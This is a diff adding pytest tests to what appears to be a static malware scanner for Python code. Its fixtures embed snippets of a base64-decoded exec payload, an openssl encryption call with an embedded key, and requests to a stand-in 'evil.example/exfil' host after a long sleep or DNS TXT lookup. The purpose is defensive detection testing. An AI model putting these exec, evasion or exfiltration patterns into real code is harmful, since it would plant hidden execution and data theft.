@@ -620,6 +620,57 @@ def test_hidden_network_exec_reopens_on_endpoint_change():
     assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
 
 
+def test_base64_exec_blob_combo_binds_blob_digest():
+    # The blob may sit on a separate line from the decode call; the finding now
+    # digests it, so a changed payload reopens even with unchanged base64/exec.
+    b1 = "BLOB = '" + "A" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
+    b2 = "BLOB = '" + "B" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
+    f1 = [f for f in sp.check_py_file(b1, "p/m.py", "p") if "large encoded blob" in f.check]
+    f2 = [f for f in sp.check_py_file(b2, "p/m.py", "p") if "large encoded blob" in f.check]
+    assert f1 and f2
+    assert "Blob: sha256:" in f1[0].evidence
+    assert sp._finding_key(f1[0]) != sp._finding_key(f2[0])
+
+
+def test_openssl_key_combo_binds_key_evidence():
+    # openssl + embedded key with no network must bind the key, so a changed key
+    # reopens instead of riding the OpenSSL line alone.
+    o1 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----A"\n'
+    o2 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----B"\n'
+    g1 = [f for f in sp.check_py_file(o1, "p/o.py", "p") if "openssl encryption" in f.check]
+    g2 = [f for f in sp.check_py_file(o2, "p/o.py", "p") if "openssl encryption" in f.check]
+    assert g1 and g2
+    assert "Key:" in g1[0].evidence
+    assert sp._finding_key(g1[0]) != sp._finding_key(g2[0])
+
+
+def test_anti_analysis_combo_binds_suspicious_side():
+    # The anti-analysis combo records the network/exec side, so a changed exfil
+    # endpoint reopens instead of riding the unchanged sleep/trace line.
+    old = "import time, requests\ntime.sleep(600)\nrequests.get('http://old.example')\n"
+    new = "import time, requests\ntime.sleep(600)\nrequests.get('http://evil.example/exfil')\n"
+    fo = [f for f in sp.check_py_file(old, "p/x.py", "p")
+          if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"]
+    fn = [f for f in sp.check_py_file(new, "p/x.py", "p")
+          if f.check == "Anti-analysis/sandbox evasion + suspicious behavior"]
+    assert fo and fn
+    assert "Network:" in fo[0].evidence
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
+def test_dns_exfil_combo_binds_other_side():
+    # The DNS exfil combo records the co-occurring network side, so a changed
+    # endpoint reopens instead of riding the unchanged DNS line.
+    old = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://old.example')\n"
+    new = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://evil.example/x')\n"
+    fo = [f for f in sp.check_py_file(old, "p/d.py", "p")
+          if f.check == "DNS exfiltration / tunneling patterns"]
+    fn = [f for f in sp.check_py_file(new, "p/d.py", "p")
+          if f.check == "DNS exfiltration / tunneling patterns"]
+    assert fo and fn
+    assert sp._finding_key(fo[0]) != sp._finding_key(fn[0])
+
+
 def test_large_js_bundle_finding_is_content_bound():
     # A large benign JS bundle yields a HIGH carrying a content digest, not empty
     # evidence: two different bundles in the same size bucket get different keys,
